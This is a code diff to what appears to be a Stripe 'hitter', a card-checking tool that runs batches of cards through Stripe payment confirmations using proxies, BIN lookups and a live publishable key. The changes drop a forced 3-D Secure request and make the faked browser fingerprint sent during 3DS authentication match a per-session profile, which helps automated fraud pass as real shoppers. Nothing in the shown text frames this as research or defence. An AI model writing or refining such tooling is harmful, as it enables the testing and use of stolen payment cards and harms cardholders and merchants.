@@ -1271,7 +1271,6 @@ class StripeAPIHitter:
                                                 "payment_method": pm_id,
                                                 "expected_payment_method_type": "card",
                                                 "use_stripe_sdk": "true",
-                                                "payment_method_options[card][request_three_d_secure]": "automatic",
                                                 "consent[terms_of_service]": "accepted",
                                                 "key": self.pk_live,
                                             }
@@ -1333,14 +1332,13 @@ class StripeAPIHitter:
                                         state = "redirected"
                                         processed_auth = True
                                     elif source:
-                                        # Friend's mobile profile for 3DS authenticate
-                                        _mobile_ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
+                                        # Use same profile UA for 3DS — no UA switching
                                         auth_headers = {
                                             "accept": "application/json",
                                             "content-type": "application/x-www-form-urlencoded",
                                             "origin": "https://js.stripe.com",
                                             "referer": "https://js.stripe.com/",
-                                            "user-agent": _mobile_ua
+                                            "user-agent": profile["user_agent"]
                                         }
                                         browser = {
                                             "fingerprintAttempted": True,
@@ -1350,11 +1348,11 @@ class StripeAPIHitter:
                                             "browserJavaEnabled": False,
                                             "browserJavascriptEnabled": True,
                                             "browserLanguage": "en-US",
-                                            "browserColorDepth": "24",
-                                            "browserScreenHeight": "873",
-                                            "browserScreenWidth": "393",
+                                            "browserColorDepth": str(profile.get("color_depth", "24")),
+                                            "browserScreenHeight": str(profile.get("screen_height", "1080")),
+                                            "browserScreenWidth": str(profile.get("screen_width", "1920")),
                                             "browserTZ": "-300",
-                                            "browserUserAgent": _mobile_ua
+                                            "browserUserAgent": profile["user_agent"]
                                         }
                                         auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
                                         auth_data = {
@@ -1707,7 +1705,7 @@ class ConcurrentHitter:
             await self.update_callback({"status": "error", "error": "Failed to analyze Stripe endpoint. Proxies might be dead."})
         return False
 
-    async def _process_single_card(self, card: dict, attempt_num: int, queue: asyncio.Queue = None, session=None):
+    async def _process_single_card(self, card: dict, attempt_num: int, session=None):
         max_retries = 2
         bin_info = await BINLookup.lookup(card['card'])
         bin_country = bin_info.get('country', '')
@@ -1796,14 +1794,7 @@ class ConcurrentHitter:
             else:
                 self.fails += 1
         
-        if result['success']:
-            if queue is not None:
-                while not queue.empty():
-                    try:
-                        queue.get_nowait()
-                    except asyncio.QueueEmpty:
-                        break
-            
+        
         if self.update_callback:
             await self.update_callback({
                 "status": "progress",
@@ -1836,7 +1827,7 @@ class ConcurrentHitter:
                 
                 attempt_num = idx + 1
                 try:
-                    await self._process_single_card(card, attempt_num, queue=None, session=shared_session)
+                    await self._process_single_card(card, attempt_num, session=shared_session)
                 except Exception as e:
                     import traceback
                     print(f"DEBUG: Processing card failed: {e}\n{traceback.format_exc()}")
